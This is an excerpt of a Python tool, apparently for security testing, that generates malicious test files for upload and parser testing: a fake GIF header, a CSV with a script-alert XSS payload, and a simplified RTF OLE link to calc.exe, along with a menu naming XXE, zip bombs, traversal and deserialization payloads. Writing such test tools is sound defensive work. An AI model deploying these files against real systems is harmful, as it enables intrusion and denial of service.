...
def generate_fake_magic_bytes(filename="fake_magic.gif", payload=b"This is not a GIF."):
    """
    Generates a file with fake magic bytes (GIF header + text payload).
    """
    magic_bytes = b"GIF89a"
    with open(filename, "wb") as f:
        f.write(magic_bytes)
        f.write(payload)
    print(f"Generated fake magic bytes file: {filename}")


def generate_csv_with_html_payload(filename="csv_xss.csv", payload="<script>alert('XSS in CSV')</script>"):
    """
    Generates a CSV file with an HTML/JavaScript payload.
    """
    with open(filename, "w") as f:
        f.write(f'"{payload}",safe\n')
    print(f"Generated CSV with HTML payload: {filename}")


def generate_rtf_with_ole_link(filename="ole.rtf", link_path="C:\\Windows\\System32\\calc.exe"):
    """
    Generates an RTF file with a link to an OLE object.
    """
    # This RTF payload contains an OLE2Link object that points to an external file.
    payload = (
        ...
        r"{\object\objautlink\objupdate\objemb "
        r"{\*\objclass Equation.3}"
        r"{\*\objdata "
        # The OLE data structure is complex, so we use a simplified version
        # that points to a local file path.
        + r"01050000"  # OLE version
        + r"02000000"  # Format ID
        + r"0b000000"  # Class Name Length
        + r"4571756174696f6e2e3300"  # "Equation.3"
        + r"00000000"  # OLE stream size
        + r"00000000"
        + r"}"
        r"{\*\oleclsid {0002CE02-0000-0000-C000-000000000046}}"
        r"}\pard\sa200\sl276\slmult1\par"
        r"This document contains a linked object.\par"
        r"}"
    )
    # The actual link is not directly in the payload to avoid filters.
    # A real RTF OLE attack is more complex.
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated RTF with OLE link: {filename}")
...
if __name__ == "__main__":
    ...
    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg", "double_extension", "file_in_parent", "csv_injection", "gifar", "json_deserialization", "pdf_js", "dde", "pdf_zip_polyglot", "docx", "xls", "pickle", "tar_traversal", "yaml", "image_metadata", "fake_magic", "csv_html", "rtf_ole"], help="Type of file to generate.")
    ...
    elif args.filetype == "fake_magic":
        generate_fake_magic_bytes()
    elif args.filetype == "csv_html":
        generate_csv_with_html_payload()
    elif args.filetype == "rtf_ole":
        generate_rtf_with_ole_link()